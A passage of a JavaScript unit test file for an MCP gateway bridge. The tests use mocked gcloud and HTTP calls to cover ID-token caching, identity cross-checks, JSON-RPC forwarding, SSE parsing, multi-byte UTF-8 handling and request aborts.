/**
 * Unit tests for src/index.js (the intelligence-mcp-bridge entrypoint).
 *
 * Tests the token-cache + preFlight logic with injected gcloud + clock + http.
 * The bridge is structured so that execGcloud is mockable, createTokenCache
 * takes a custom executor + clock, and forwardRequest takes a custom http
 * request function.
 *
 * No real network or gcloud calls happen here.
 *
 * TODO(integration): main()'s full pipeline (process.stdin → lineSplitter →
 * lineTransform → process.stdout) is NOT exercised end-to-end by any test
 * in this file. The HOL-blocking fix's correctness depends on:
 *   (a) handleMessage being called per-line — covered by direct unit tests
 *       in the "handleMessage — concurrent dispatch" describe block;
 *   (b) the Transform.push() → process.stdout glue actually emitting
 *       responses correctly — NOT covered here.
 * Reviewer 2026-05-17 flagged this gap. E2E validation today comes from
 * the operator's `npx -y @hafla/intelligence-mcp-bridge@1.0.1` smoke test
 * against the live mcp.hafla.com gateway. A future integration test could
 * spawn a real `node src/index.js` child with mocked gcloud + a local MCP
 * gateway stub, write JSON lines to its stdin, and assert stdout — but
 * doing it correctly requires a fixture for the gcloud subprocess and a
 * lightweight HTTPS server, which is more setup than this branch warrants.
 * Tracked for a future 1.x release if/when MCP-client compatibility
 * regressions surface in real use.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import {
  createTokenCache,
  preFlight,
  forwardRequest,
  decodeJwtPayloadNoVerify,
  handleMessage,
  extractSseJson,
  execGcloud,
  validateAudience,
  _checkIsMainModule
} from '../src/index.js';

import { assertNode24 } from '../src/version-check.js';
import {
  parseDrainTimeoutMs,
  DEFAULT_DRAIN_TIMEOUT_MS
} from '../src/drain-timeout.js';

// ── JWT-shaped token builder for cross-check tests ──────────────────────────
// Cross-check decodes the minted token's payload; tests need real JWT-shaped
// inputs (header.payload.fakesig) so the decoder doesn't reject them.
function makeJwt(payload) {
  const b64u = (obj) =>
    Buffer.from(JSON.stringify(obj))
      .toString('base64')
      .replace(/=+$/, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');
  return `${b64u({ alg: 'RS256', typ: 'JWT' })}.${b64u(payload)}.fakesig`;
}

// Collects fail() calls instead of process.exit-ing. Tests assert the
// collected calls to verify both that fail fired AND what it said.
function collectingFailFn() {
  const calls = [];
  const fn = (...lines) => {
    calls.push(lines);
    // Mimic fail()'s control-flow side effect: caller treats fail() as
    // terminal and bails out via `return`. Tests therefore expect cachedToken
    // to remain unset on rejection paths.
  };
  fn.calls = calls;
  return fn;
}

// ── createTokenCache ────────────────────────────────────────────────────────

describe('createTokenCache', () => {
  test('mints on first call, returns cached on second call', async () => {
    let mintCalls = 0;
    const cache = createTokenCache({
      execGcloudFn: async () => {
        mintCalls += 1;
        return `token-${mintCalls}`;
      },
      lifetimeMs: 60_000,
      refreshBeforeMs: 5_000,
      now: () => 0
    });

    const t1 = await cache.getToken();
    const t2 = await cache.getToken();
    assert.equal(t1, 'token-1');
    assert.equal(t2, 'token-1');
    assert.equal(mintCalls, 1);
  });

  test('refreshes when within the refresh-before window', async () => {
    let mintCalls = 0;
    let nowValue = 0;
    const cache = createTokenCache({
      execGcloudFn: async () => {
        mintCalls += 1;
        return `token-${mintCalls}`;
      },
      lifetimeMs: 60_000,
      refreshBeforeMs: 5_000,
      now: () => nowValue
    });

    await cache.getToken(); // t=0 — mint
    nowValue = 50_000; // still well within fresh window
    await cache.getToken();
    assert.equal(mintCalls, 1);

    nowValue = 56_000; // inside the refresh-before window (>60000-5000)
    await cache.getToken();
    assert.equal(mintCalls, 2);
  });

  test('concurrent getToken() coalesces into single mint (stampede prevention)', async () => {
    // Regression guard for HIGH #2 (token cache stampede). MCP clients
    // commonly fire 3-5 concurrent requests on connection (initialize +
    // tools/list + resources/list + ...); without coalescing, each
    // would spawn its own `gcloud auth print-identity-token` subprocess.
    // The pendingMint promise must absorb all concurrent callers into a
    // single in-flight mint.
    let mintCount = 0;
    const cache = createTokenCache({
      execGcloudFn: async () => {
        mintCount += 1;
        // Delay so concurrent callers all race past the cache check
        // before this resolves
        await new Promise((r) => setTimeout(r, 20));
        return `token-${mintCount}`;
      },
      lifetimeMs: 60_000,
      refreshBeforeMs: 5_000,
      now: () => 0
    });

    const tokens = await Promise.all([
      cache.getToken(),
      cache.getToken(),
      cache.getToken(),
      cache.getToken(),
      cache.getToken()
    ]);

    assert.equal(
      mintCount,
      1,
      'execGcloudFn must be called exactly once despite 5 concurrent callers'
    );
    assert.ok(
      tokens.every((t) => t === 'token-1'),
      'all callers must receive the same token'
    );
    assert.equal(
      cache._state().pendingMint,
      false,
      'pendingMint promise must clear after the mint resolves'
    );
  });

  test('concurrent getToken() after invalidate() coalesces re-mint too', async () => {
    // Edge case: after invalidate() clears the cache, multiple parallel
    // callers should ALSO coalesce — not spawn N more gcloud processes.
    let mintCount = 0;
    const cache = createTokenCache({
      execGcloudFn: async () => {
        mintCount += 1;
        await new Promise((r) => setTimeout(r, 10));
        return `token-${mintCount}`;
      },
      lifetimeMs: 60_000,
      refreshBeforeMs: 5_000,
      now: () => 0
    });

    await cache.getToken(); // mint 1
    cache.invalidate();
    const tokens = await Promise.all([
      cache.getToken(),
      cache.getToken(),
      cache.getToken()
    ]);

    assert.equal(
      mintCount,
      2,
      'exactly 2 mints total: initial + 1 coalesced re-mint'
    );
    assert.ok(tokens.every((t) => t === 'token-2'));
  });

  test('invalidate forces re-mint on next getToken', async () => {
    let mintCalls = 0;
    const cache = createTokenCache({
      execGcloudFn: async () => {
        mintCalls += 1;
        return `token-${mintCalls}`;
      },
      lifetimeMs: 60_000,
      refreshBeforeMs: 5_000,
      now: () => 0
    });

    await cache.getToken();
    assert.equal(mintCalls, 1);
    cache.invalidate();
    await cache.getToken();
    assert.equal(mintCalls, 2);
  });
});

// ── Shape B + post-mint identity cross-check (1.0.1 / BS-3 resolution) ─────
//
// Five enumerated cases per the canonical synthesis plan
// (`specs/.../research/2026-05-16-bs3-final-plan-synthesis.md` § Bridge 1.0.1):
//   (a) SA active + SA token same           → mint succeeds; no reject
//   (b) human active + same human token     → mint succeeds; no reject
//   (c) human active + SA token             → hard-reject (identity mismatch)
//   (d) human active + different-human token → hard-reject (identity mismatch)
//   (e) token has NO email claim            → hard-reject (missing email)

describe('createTokenCache — Shape B + identity cross-check', () => {
  test('(a) SA active + SA token: mints with --audiences; cross-check passes', async () => {
    const saEmail =
      'mcp-gw-production-sa@hafla-backend-v1.iam.gserviceaccount.com';
    const seenArgs = [];
    const cache = createTokenCache({
      activeAccount: saEmail,
      execGcloudFn: async (args) => {
        seenArgs.push(args);
        return makeJwt({ email: saEmail });
      },
      audience: 'https://mcp.hafla.com',
      now: () => 0
    });
    const token = await cache.getToken();
    assert.ok(token, 'token must mint successfully');
    assert.deepEqual(seenArgs[0], [
      'auth',
      'print-identity-token',
      '--audiences=https://mcp.hafla.com'
    ]);
  });

  test('(b) human active + same human token: mints WITHOUT --audiences; cross-check passes', async () => {
    const human = 'sidd@hafla.com';
    const seenArgs = [];
    const cache = createTokenCache({
      activeAccount: human,
      execGcloudFn: async (args) => {
        seenArgs.push(args);
        return makeJwt({ email: human, hd: 'hafla.com' });
      },
      now: () => 0
    });
    const token = await cache.getToken();
    assert.ok(token, 'human-active mint must succeed under Path A multi-aud');
    assert.deepEqual(
      seenArgs[0],
      ['auth', 'print-identity-token'],
      '--audiences MUST be omitted for human active accounts (Shape B)'
    );
  });

  test('(c) human active + SA token (impersonation config): hard-rejects', async () => {
    const human = 'sidd@hafla.com';
    const saEmail = 'attacker-sa@evil-project.iam.gserviceaccount.com';
    const failFn = collectingFailFn();
    const cache = createTokenCache({
      activeAccount: human,
      execGcloudFn: async () => makeJwt({ email: saEmail }),
      failFn,
      now: () => 0
    });
    // Issue #4 fix: getToken() now REJECTS on identity-mismatch instead of
    // resolving to undefined. This guarantees that if a future supervisor /
    // test injects a non-terminating failFn, callers awaiting getToken()
    // get a clean rejection rather than "Bearer undefined" downstream.
    await assert.rejects(cache.getToken(), /Identity mismatch/);
    assert.equal(cache._state().cached, false, 'token must NOT be cached');
    assert.equal(failFn.calls.length, 1, 'failFn must be called exactly once');
    const message = failFn.calls[0].join('\n');
    assert.match(message, /Identity mismatch/);
    assert.match(message, new RegExp(saEmail.replace(/\./g, '\\.')));
    assert.match(message, /impersonate/i);
  });

  test('(d) human active + different-human token: hard-rejects', async () => {
    const active = 'sidd@hafla.com';
    const other = 'someone-else@hafla.com';
    const failFn = collectingFailFn();
    const cache = createTokenCache({
      activeAccount: active,
      execGcloudFn: async () => makeJwt({ email: other, hd: 'hafla.com' }),
      failFn,
      now: () => 0
    });
    await assert.rejects(cache.getToken(), /Identity mismatch/);
    assert.equal(cache._state().cached, false);
    const message = failFn.calls[0].join('\n');
    assert.match(message, /Identity mismatch/);
  });

  test('(e) token has NO email claim: hard-rejects with dedicated message', async () => {
    const human = 'sidd@hafla.com';
    const failFn = collectingFailFn();
    const cache = createTokenCache({
      activeAccount: human,
      execGcloudFn: async () => makeJwt({ sub: '12345' /* no email */ }),
      failFn,
      now: () => 0
    });
    await assert.rejects(cache.getToken(), /missing email claim/);
    assert.equal(cache._state().cached, false);
    const message = failFn.calls[0].join('\n');
    // Dedicated "missing email" framing — different from the identity-
    // mismatch path even though the root cause (impersonation config) is
    // usually the same.
    assert.match(message, /no `email` claim/);
    // Message must direct the operator at the actionable root cause
    // (unset impersonation config) — NOT at adding gcloud flags they
    // don't control (the bridge owns gcloud args).
    assert.match(message, /impersonat/);
    assert.match(
      message,
      /gcloud config unset auth\/impersonate_service_account/
    );
    assert.doesNotMatch(
      message,
      /Identity mismatch/,
      'missing-email path must use its own message, not the impersonation one'
    );
    assert.doesNotMatch(
      message,
      /--include-email/,
      'do NOT instruct the operator to add gcloud flags — the bridge owns the gcloud invocation; the operator cannot pass flags through'
    );
  });

  test('execGcloud throws PERMISSION_DENIED → catch-block surfaces actionable banner', async () => {
    // Covers the mint-itself-fails path (distinct from the mint-succeeds-
    // but-cross-check-rejects paths covered by tests (c) and (d)). Real
    // production triggers for this: operator's gcloud creds expired, or
    // tokenCreator role revoked mid-session, or — empirically-unverified —
    // gcloud's IAM Credentials API rejecting an impersonated mint that
    // lacks --audiences. All three surface here as a "Failed to mint"
    // banner so the catch-block is the single recovery point.
    const failFn = collectingFailFn();
    const cache = createTokenCache({
      activeAccount: 'sidd@hafla.com',
      execGcloudFn: async () => {
        const err = new Error(
          'PERMISSION_DENIED: Caller does not have permission roles/iam.serviceAccountTokenCreator on SA'
        );
        err.stderr =
          'ERROR: (gcloud.auth.print-identity-token) PERMISSION_DENIED ...';
        throw err;
      },
      failFn,
      now: () => 0
    });
    await assert.rejects(cache.getToken(), /Failed to mint Google ID token/);
    assert.equal(failFn.calls.length, 1);
    assert.equal(cache._state().cached, false);
    const message = failFn.calls[0].join('\n');
    assert.match(message, /Failed to mint Google ID token/);
    assert.match(message, /PERMISSION_DENIED/);
    assert.match(
      message,
      /roles\/iam\.serviceAccountTokenCreator/,
      'banner must name the missing role so operators know what to request'
    );
  });

  test('malformed JWT (wrong segment count) → catch-block surfaces decoder banner', async () => {
    // Exercises the post-mint decode path when execGcloud returns
    // something that does not parse as a JWT. The decodeJwtFn injection
    // point in createTokenCache exists for this scenario — without this
    // test it is unexercised API surface. We use the default decoder
    // (no injection) since a real gcloud-returns-garbage scenario does
    // not go through a custom decoder; the test thereby covers both the
    // decoder's segment-count guard AND the catch-block in getToken().
    const failFn = collectingFailFn();
    const cache = createTokenCache({
      activeAccount: 'sidd@hafla.com',
      execGcloudFn: async () => 'not-a-jwt-shape', // 1 segment → decoder throws
      failFn,
      now: () => 0
    });
    await assert.rejects(cache.getToken(), /not a valid JWT/);
    assert.equal(failFn.calls.length, 1);
    assert.equal(cache._state().cached, false);
    const message = failFn.calls[0].join('\n');
    assert.match(message, /does not parse as a JWT/);
    assert.match(message, /gcloud components update/);
  });

  test('case-insensitive identity match (active=Sidd@HAFLA.com vs token email=sidd@hafla.com)', async () => {
    const failFn = collectingFailFn();
    const cache = createTokenCache({
      activeAccount: 'Sidd@HAFLA.com',
      execGcloudFn: async () =>
        makeJwt({ email: 'sidd@hafla.com', hd: 'hafla.com' }),
      failFn,
      now: () => 0
    });
    const token = await cache.getToken();
    assert.ok(
      token,
      'case-variant active vs token must NOT be flagged as mismatch'
    );
    assert.equal(failFn.calls.length, 0);
  });
});

describe('decodeJwtPayloadNoVerify', () => {
  test('decodes a valid JWT payload', () => {
    const claims = decodeJwtPayloadNoVerify(
      makeJwt({ email: 'a@b.com', hd: 'b.com' })
    );
    assert.equal(claims.email, 'a@b.com');
    assert.equal(claims.hd, 'b.com');
  });

  test('throws on a non-JWT string (wrong segment count)', () => {
    assert.throws(() => decodeJwtPayloadNoVerify('not.a-jwt'), /expected 3/);
    assert.throws(() => decodeJwtPayloadNoVerify('one-segment'), /expected 3/);
  });
});

// ── preFlight ───────────────────────────────────────────────────────────────
// preFlight calls process.exit on failure paths, so each failure-mode test
// would need to fork a child to assert exit codes. The success path is what
// we cover here. Real gcloud-not-installed scenarios are covered by smoke
// tests against the published package.

describe('preFlight', () => {
  test('returns active account on human happy path', async () => {
    const account = await preFlight({
      execGcloudFn: async (args) => {
        if (args[0] === 'auth' && args[1] === 'list') {
          return 'sidd@hafla.com';
        }
        throw new Error(`unexpected args: ${args.join(' ')}`);
      }
    });
    assert.equal(account, 'sidd@hafla.com');
  });

  test('accepts mixed-case @hafla.com email (case-insensitive domain check)', async () => {
    // Regression guard for MEDIUM #4. The gateway's middleware case-normalises
    // emails before the OpsUsers lookup; the bridge's preFlight must mirror
    // that behaviour so a stray-case account doesn't 403 at startup.
    const account = await preFlight({
      execGcloudFn: async (args) => {
        if (args[0] === 'auth' && args[1] === 'list') {
          return 'Sidd@HAFLA.com'; // mixed case — gateway lowercases at lookup
        }
        throw new Error(`unexpected args: ${args.join(' ')}`);
      }
    });
    assert.equal(
      account,
      'Sidd@HAFLA.com',
      'preFlight returns the active account verbatim — case-normalisation is only for the domain match, not the email itself'
    );
  });

  test('returns active account on SA happy path (CI / Cloud Run / Vertex)', async () => {
    // Regression: an earlier draft of preFlight rejected any active account
    // not ending in @hafla.com, which would have blocked the SA-native flow
    // that createTokenCache's Shape B branch is explicitly designed to serve.
    // Code reviewer (2026-05-16) caught the contradiction; this test guards
    // against any future re-introduction.
    const saEmail =
      'mcp-gw-production-sa@hafla-backend-v1.iam.gserviceaccount.com';
    const account = await preFlight({
      execGcloudFn: async (args) => {
        if (args[0] === 'auth' && args[1] === 'list') {
          return saEmail;
        }
        throw new Error(`unexpected args: ${args.join(' ')}`);
      }
    });
    assert.equal(account, saEmail);
  });
});

// ── forwardRequest ──────────────────────────────────────────────────────────
// We build a minimal mock https.request via Node's EventEmitter pattern.

import { EventEmitter } from 'node:events';

function mockHttpRequest({ statusCode, body }) {
  return (options, callback) => {
    const req = new EventEmitter();
    req.write = () => {};
    req.end = () => {
      const res = new EventEmitter();
      res.statusCode = statusCode;
      // Real Node http.IncomingMessage exposes setEncoding(); the bridge
      // calls it to engage StringDecoder for safe multi-byte UTF-8
      // handling across TCP chunks. Mock as a no-op so the bridge can
      // call it without crashing the test. Tests that specifically need
      // to assert setEncoding-was-called build their own mock (see the
      // "multi-byte UTF-8 response body" describe block).
      res.setEncoding = () => {};
      callback(res);
      setImmediate(() => {
        // Emit a string (matching the post-setEncoding behaviour of real
        // Node http) so `body += chunk` produces the expected output.
        res.emit('data', body);
        res.emit('end');
      });
    };
    req.destroy = () => {};
    return req;
  };
}

describe('handleMessage — concurrent dispatch (HIGH #1 fix)', () => {
  test('does NOT serialize forwardRequest calls — second call starts before first resolves', async () => {
    // Regression guard for HIGH #1 (head-of-line blocking). The previous
    // design called the Transform callback INSIDE forwardRequest's .then(),
    // forcing the stream to wait for each HTTP round-trip before reading
    // the next line. This broke notifications/cancellation. The fix calls
    // callback() immediately and pushes responses asynchronously. This
    // test proves the new contract: a second handleMessage call's
    // forwardRequest starts even while the first is still pending.
    let firstStarted = false;
    let secondStarted = false;
    let releaseFirst;
    const firstPromise = new Promise((r) => {
      releaseFirst = r;
    });

    const fakeForwardRequest = async (msg) => {
      if (msg.id === 1) {
        firstStarted = true;
        await firstPromise; // hang until released
        return { jsonrpc: '2.0', result: 'first', id: 1 };
      }
      if (msg.id === 2) {
        secondStarted = true;
        return { jsonrpc: '2.0', result: 'second', id: 2 };
      }
      throw new Error(`unexpected id: ${msg.id}`);
    };

    const pushed = [];
    const pushFn = (line) => pushed.push(line);

    // Fire both without awaiting either
    const p1 = handleMessage(
      JSON.stringify({ jsonrpc: '2.0', method: 'a', id: 1 }),
      { tokenCache: null, pushFn, forwardRequestFn: fakeForwardRequest }
    );
    const p2 = handleMessage(
      JSON.stringify({ jsonrpc: '2.0', method: 'b', id: 2 }),
      { tokenCache: null, pushFn, forwardRequestFn: fakeForwardRequest }
    );

    // Tick the microtask queue so both forwardRequest invocations get a chance to run
    await new Promise((r) => setImmediate(r));

    assert.equal(firstStarted, true, 'first request must have started');
    assert.equal(
      secondStarted,
      true,
      'second request must have started even though first is hanging — proves HOL blocking is gone'
    );

    // Now release the first; both should complete out-of-order (second responded first)
    releaseFirst();
    await Promise.all([p1, p2]);

    assert.equal(pushed.length, 2);
    const responses = pushed.map((l) => JSON.parse(l));
    assert.deepEqual(
      responses.map((r) => r.id).sort(),
      [1, 2],
      'both responses must be pushed (order is not guaranteed)'
    );
  });

  test('parse error pushes -32700 without invoking forwardRequest', async () => {
    let forwardCalled = false;
    const pushed = [];
    await handleMessage('this-is-not-json', {
      tokenCache: null,
      pushFn: (l) => pushed.push(l),
      forwardRequestFn: async () => {
        forwardCalled = true;
      }
    });
    assert.equal(forwardCalled, false);
    assert.equal(pushed.length, 1);
    const resp = JSON.parse(pushed[0]);
    assert.equal(resp.error.code, -32700);
    assert.equal(resp.error.message, 'Parse error');
    assert.equal(resp.id, null);
  });

  test('forwardRequest throws → pushes -32603 with original message id', async () => {
    const pushed = [];
    await handleMessage(
      JSON.stringify({ jsonrpc: '2.0', method: 'x', id: 42 }),
      {
        tokenCache: null,
        pushFn: (l) => pushed.push(l),
        forwardRequestFn: async () => {
          throw new Error('synthetic-failure');
        }
      }
    );
    assert.equal(pushed.length, 1);
    const resp = JSON.parse(pushed[0]);
    assert.equal(resp.error.code, -32603);
    assert.equal(resp.error.message, 'Internal error');
    assert.equal(resp.id, 42);
  });

  test('empty/whitespace line is a no-op (no push, no forwardRequest)', async () => {
    const pushed = [];
    let forwardCalled = false;
    await handleMessage('   \t  ', {
      tokenCache: null,
      pushFn: (l) => pushed.push(l),
      forwardRequestFn: async () => {
        forwardCalled = true;
      }
    });
    assert.equal(pushed.length, 0);
    assert.equal(forwardCalled, false);
  });
});

describe('forwardRequest — multi-byte UTF-8 response body (dl-review 2026-05-17 MEDIUM #1)', () => {
  test('correctly reassembles multi-byte UTF-8 split across response chunks', async () => {
    // The MCP gateway returns tool results that routinely include
    // non-ASCII content: WhatsApp message bodies (Arabic, emoji),
    // AlloyDB queries against user-entered text, etc. If a TCP chunk
    // boundary splits a multi-byte UTF-8 codepoint (a 4-byte emoji or
    // 2-3 byte Arabic letter), the previous code's `body += chunk.toString()`
    // corrupted the codepoint. With `res.setEncoding('utf8')`, Node's
    // internal StringDecoder buffers partial sequences correctly.
    //
    // This test simulates real Node http behaviour:
    //   - mock res tracks whether setEncoding('utf8') was called
    //   - if called: emit chunks via StringDecoder (Node's real behaviour)
    //   - if not: emit raw Buffers (the bug path)
    // Test asserts the bridge took the correct path and the content
    // survives intact.
    const { StringDecoder } = await import('node:string_decoder');

    // "حبا 🇸🇦" — Arabic + Saudi flag emoji. UTF-8 bytes are
    // multi-byte everywhere; any split between bytes 1 and 11 falls
    // inside a multi-byte sequence.
    const payload = { jsonrpc: '2.0', result: { content: 'حبا 🇸🇦' }, id: 1 };
    const bytes = Buffer.from(JSON.stringify(payload), 'utf8');
    // Find a split offset guaranteed mid-codepoint. Bytes 1-8 are inside
    // the Arabic + emoji area when JSON is `{"jsonrpc":"2.0","result":{"content":"حبا 🇸🇦"},"id":1}`.
    // Pick offset 35 — likely lands mid-Arabic.
    const splitOffset = 35;
    const chunk1 = bytes.subarray(0, splitOffset);
    const chunk2 = bytes.subarray(splitOffset);

    const mockReq = (options, callback) => {
      const req = new EventEmitter();
      let encoding = null;
      req.write = () => {};
      req.end = () => {
        const res = new EventEmitter();
        res.statusCode = 200;
        res.setEncoding = (enc) => {
          encoding = enc;
        };
        callback(res);
        setImmediate(() => {
          if (encoding === 'utf8') {
            // Bridge correctly called setEncoding → Node would decode
            // via StringDecoder. Simulate that.
            const decoder = new StringDecoder('utf8');
            res.emit('data', decoder.write(chunk1));
            res.emit('data', decoder.write(chunk2));
            const tail = decoder.end();
            if (tail) res.emit('data', tail);
          } else {
            // Bridge did NOT call setEncoding → raw Buffers emitted →
            // bug path. body += chunk.toString() on partial buffer corrupts.
            res.emit('data', chunk1);
            res.emit('data', chunk2);
          }
          res.emit('end');
        });
      };
      req.destroy = () => {};
      return req;
    };

    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });

    const result = await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/call', id: 1 },
      {
        tokenCache,
        httpRequestFn: mockReq,
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );

    assert.equal(
      result.result?.content,
      'حبا 🇸🇦',
      'multi-byte UTF-8 content must survive intact across chunk boundaries — proves res.setEncoding("utf8") is engaged'
    );
  });

  test('calls res.setEncoding("utf8") before attaching the data handler', async () => {
    // Belt-and-suspenders: directly assert the call ordering. Catches a
    // future refactor that accidentally removes the setEncoding line.
    const events = [];
    const mockReq = (options, callback) => {
      const req = new EventEmitter();
      req.write = () => {};
      req.end = () => {
        const res = new EventEmitter();
        res.statusCode = 200;
        res.setEncoding = () => events.push('setEncoding');
        const origOn = res.on.bind(res);
        res.on = (ev, fn) => {
          if (ev === 'data') events.push('data-handler-attached');
          return origOn(ev, fn);
        };
        callback(res);
        setImmediate(() => {
          res.emit('data', '{"jsonrpc":"2.0","result":"ok","id":1}');
          res.emit('end');
        });
      };
      req.destroy = () => {};
      return req;
    };

    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });

    await forwardRequest(
      { jsonrpc: '2.0', method: 'x', id: 1 },
      {
        tokenCache,
        httpRequestFn: mockReq,
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );

    const setEncIdx = events.indexOf('setEncoding');
    const dataHandlerIdx = events.indexOf('data-handler-attached');
    assert.ok(
      setEncIdx !== -1,
      'res.setEncoding MUST be called — see dl-review 2026-05-17 MEDIUM #1'
    );
    assert.ok(
      setEncIdx < dataHandlerIdx,
      'setEncoding MUST be called BEFORE the data handler is attached, else early chunks bypass StringDecoder'
    );
  });
});

describe('extractSseJson', () => {
  test('parses single-frame SSE response with leading space after data:', () => {
    const body =
      'event: message\ndata: {"jsonrpc":"2.0","id":1,"result":"ok"}\n\n';
    const parsed = extractSseJson(body);
    assert.equal(parsed.result, 'ok');
    assert.equal(parsed.id, 1);
  });

  test('parses SSE without leading space after data:', () => {
    const body =
      'event: message\ndata:{"jsonrpc":"2.0","id":2,"result":"ok"}\n\n';
    const parsed = extractSseJson(body);
    assert.equal(parsed.id, 2);
  });

  test('joins multi-line data: fields per SSE spec', () => {
    const body =
      'event: message\ndata: {"jsonrpc":"2.0",\ndata: "id":3,"result":"ok"}\n\n';
    const parsed = extractSseJson(body);
    assert.equal(parsed.id, 3);
  });

  test('handles CRLF line endings', () => {
    const body =
      'event: message\r\ndata: {"jsonrpc":"2.0","id":4,"result":"ok"}\r\n\r\n';
    const parsed = extractSseJson(body);
    assert.equal(parsed.id, 4);
  });

  test('throws when body has no data: lines', () => {
    assert.throws(() => extractSseJson('event: ping\n\n'), /no data: lines/);
  });

  // Regression tests for gemini-code-assist's PR #2 discussion r3256298335 —
  // the earlier draft concatenated `data:` lines across event boundaries,
  // producing invalid JSON when the gateway prefixed the actual reply with
  // any keepalive / comment / progress event.

  test('returns LAST event when body has multiple complete events (ping then message)', () => {
    // Common server pattern: keepalive `ping` before the actual JSON-RPC
    // reply. With the buggy concatenation logic, the parser would attempt
    // JSON.parse('null\n{"jsonrpc":...}') and throw.
    const body =
      'event: ping\n' +
      'data: null\n' +
      '\n' +
      'event: message\n' +
      'data: {"jsonrpc":"2.0","id":42,"result":"OK"}\n' +
      '\n';
    const parsed = extractSseJson(body);
    assert.equal(parsed.id, 42);
    assert.equal(parsed.result, 'OK');
  });

  test('returns LAST event when final event has no trailing blank line', () => {
    // SSE bodies sometimes terminate without the spec-recommended trailing
    // blank line. The parser must still treat the accumulated data as the
    // final event.
    const body =
      'event: message\n' +
      'data: {"jsonrpc":"2.0","id":99,"result":"NO_TRAIL"}';
    const parsed = extractSseJson(body);
    assert.equal(parsed.id, 99);
    assert.equal(parsed.result, 'NO_TRAIL');
  });

  test('ignores ping/keepalive events that have no data: lines', () => {
    // Pure `event: ping` followed by blank line should not clobber the
    // last-known data buffer.
    const body =
      'event: message\n' +
      'data: {"jsonrpc":"2.0","id":1,"result":"first"}\n' +
      '\n' +
      ': keepalive comment\n' +
      'event: ping\n' +
      '\n';
    const parsed = extractSseJson(body);
    assert.equal(parsed.result, 'first');
  });
});

describe('forwardRequest — SSE response (gateway returns text/event-stream)', () => {
  test('correctly parses SSE-wrapped JSON-RPC reply', async () => {
    const ssePayload =
      'event: message\ndata: {"jsonrpc":"2.0","id":1,"result":{"tools":[]}}\n\n';
    const mockReq = (options, callback) => {
      const req = new EventEmitter();
      req.write = () => {};
      req.end = () => {
        const res = new EventEmitter();
        res.statusCode = 200;
        res.headers = { 'content-type': 'text/event-stream' };
        res.setEncoding = () => {};
        callback(res);
        setImmediate(() => {
          res.emit('data', ssePayload);
          res.emit('end');
        });
      };
      req.destroy = () => {};
      return req;
    };

    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });

    const result = await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
      {
        tokenCache,
        httpRequestFn: mockReq,
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );

    assert.equal(result.id, 1);
    assert.ok(Array.isArray(result.result?.tools));
  });

  test('falls back to JSON.parse when content-type is application/json', async () => {
    const mockReq = (options, callback) => {
      const req = new EventEmitter();
      req.write = () => {};
      req.end = () => {
        const res = new EventEmitter();
        res.statusCode = 200;
        res.headers = { 'content-type': 'application/json' };
        res.setEncoding = () => {};
        callback(res);
        setImmediate(() => {
          res.emit('data', '{"jsonrpc":"2.0","id":7,"result":"plain"}');
          res.emit('end');
        });
      };
      req.destroy = () => {};
      return req;
    };

    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });

    const result = await forwardRequest(
      { jsonrpc: '2.0', method: 'x', id: 7 },
      {
        tokenCache,
        httpRequestFn: mockReq,
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );

    assert.equal(result.result, 'plain');
  });
});

describe('forwardRequest — abort signal (2026-05-18 hygiene)', () => {
  // Build a request mock that captures the req object so we can assert
  // .destroy() was called on abort, AND that does NOT auto-callback so we
  // can hold the request open until we abort.
  function pendingRequestMock() {
    const captured = { req: null, destroyed: false };
    const fn = (options, callback) => {
      const req = new EventEmitter();
      req.write = () => {};
      req.end = () => {}; // pending — does NOT invoke callback; held open
      req.destroy = () => {
        captured.destroyed = true;
      };
      captured.req = req;
      return req;
    };
    fn.captured = captured;
    return fn;
  }

  test('abort fires req.destroy() and resolves with -32000 shutdown error', async () => {
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    const httpMock = pendingRequestMock();
    const controller = new AbortController();
    const requestPromise = forwardRequest(
      { jsonrpc: '2.0', method: 'tools/list', id: 99 },
      {
        tokenCache,
        httpRequestFn: httpMock,
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 60_000, // long enough that abort wins the race
        abortSignal: controller.signal
      }
    );
    // Give forwardRequest a microtask to mint the token + attach the abort
    // listener before we trigger the abort.
    await new Promise((r) => setImmediate(r));
    controller.abort();
    const result = await requestPromise;
    assert.equal(
      httpMock.captured.destroyed,
      true,
      'req.destroy() must be called when abortSignal fires'
    );
    assert.equal(result.error.code, -32000);
    assert.match(result.error.message, /Aborted on shutdown/);
    assert.equal(result.id, 99);
  });

  test('abort when no abortSignal passed: unchanged behaviour', async () => {
    // Regression guard — callers that don't opt in (e.g., tests pre-1.0.2,
    // hypothetical embedders) must see no behavioural change.
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    const result = await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/list', id: 100 },
      {
        tokenCache,
        httpRequestFn: mockHttpRequest({
          statusCode: 200,
          body: JSON.stringify({ jsonrpc: '2.0', result: { ok: 1 }, id: 100 })
        }),
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
        // no abortSignal
      }
    );
    assert.equal(result.id, 100);
    assert.deepEqual(result.result, { ok: 1 });
  });
});

describe('forwardRequest', () => {
  test('200 response is parsed and returned', async () => {
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    const result = await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
      {
        tokenCache,
        httpRequestFn: mockHttpRequest({
          statusCode: 200,
          body: JSON.stringify({
            jsonrpc: '2.0',
            result: { tools: [] },
